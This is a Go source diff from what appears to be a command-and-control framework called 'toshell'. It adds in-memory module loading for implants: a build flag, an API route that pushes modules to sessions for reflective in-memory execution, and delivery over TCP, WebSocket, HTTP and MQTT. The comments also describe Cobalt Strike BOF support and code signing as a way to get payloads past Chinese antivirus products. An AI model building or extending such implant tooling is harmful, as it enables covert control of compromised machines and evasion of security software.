@@ -21,6 +21,7 @@ import (
 	"toshell/internal/server/drivers"
 	"toshell/internal/server/logging"
 	"toshell/internal/server/mcp"
+	"toshell/internal/server/modules"
 	"toshell/internal/server/session"
 	"toshell/internal/server/task"
 )
@@ -68,6 +69,10 @@ type BuildRequest struct {
 	// BofEnabled BOF（Cobalt Strike Beacon Object File）支持：默认关闭。
 	// 开启会让载荷带上整套 Beacon* API 名字（22 处 pclntab 明文），只在需要跑 BOF 时开。
 	BofEnabled bool `json:"bof_enabled"`
+	// ExecModule 内存模块按需加载（v1.4.0 S4）：默认关闭（-tags execmodule）。
+	// 开启后该载荷可以接收 POST /api/v1/sessions/{id}/module 下发的模块，
+	// 在内存里反射加载执行 —— 一份最小载荷按需获得全功能，模块更新不必重编载荷。
+	ExecModule bool `json:"exec_module"`
 	// SignEnabled 构建后代码签名：证书在服务端配置（builder.sign_*），请求只能开启。
 	// 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行，签名是"能不能跑起来"的敲门砖。
 	SignEnabled bool `json:"sign_enabled"`
@@ -126,6 +131,11 @@ type TaskPusher interface {
 	SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error
 	SendTunnelRaw(sessionID string, rawPacket []byte) error
 	ListRelayNodes() []types.RelayNode
+	// PushModuleBlob 下发内存模块二进制（v1.4.0 S4）：
+	// payload = moduleabi.EncodeBlobFrame 的产物（[4B 头长][头 JSON][裸字节]），
+	// 各传输把它作为一帧 TypeModuleData 发出去（TCP/WS 直接下发；HTTP 入下行队列，
+	// 植入端下次心跳取走；MQTT 发布到会话主题）。token 只用于日志关联。
+	PushModuleBlob(sessionID, token string, payload []byte) error
 }
 
 type Server struct {
@@ -185,6 +195,13 @@ type Server struct {
 
 	// agentTasks 长任务挂起/恢复桥（内部任务完成 → 唤醒对应 run）。
 	agentTasks *agentTaskBridge
+
+	// moduleStore 内存模块注册表 + 一次性 token（v1.4.0 S4）。
+	// nil = 未初始化（首次用到时按 data/modules 懒初始化）；测试可直接注入临时目录。
+	moduleStore *modules.Store
+	// moduleAuditHook 模块审计事件的旁路接收器（nil = 只写日志）。
+	// 做成 hook 是为了让"审计真的写了、字段对不对"能被单测断言，而不是去匹配日志文本。
+	moduleAuditHook func(moduleAuditEvent)
 }
 
 // SetOnConfigApplied 注册配置热应用回调（设置 API 保存后触发）。
@@ -440,6 +457,9 @@ func (s *Server) setupRoutes() {
 	api.HandleFunc("/sessions/{id}", s.updateSessionHandler).Methods("PATCH")
 	api.HandleFunc("/sessions/{id}", s.deleteSessionHandler).Methods("DELETE")
 	api.HandleFunc("/sessions/{id}/capabilities", s.sessionCapabilitiesHandler).Methods("GET")
+	// 内存模块按需加载（v1.4.0 S4）：POST 下发执行，GET 列出可用模块与可用性判定。
+	api.HandleFunc("/sessions/{id}/module", s.execModuleHandler).Methods("POST")
+	api.HandleFunc("/sessions/{id}/module", s.listSessionModulesHandler).Methods("GET")
 	api.HandleFunc("/sessions/{id}/interact", s.interactSessionHandler).Methods("POST")
 	api.HandleFunc("/sessions/{id}/files", s.listFilesHandler).Methods("GET", "POST")
 	api.HandleFunc("/sessions/{id}/files/download", s.downloadFileHandler).Methods("POST")
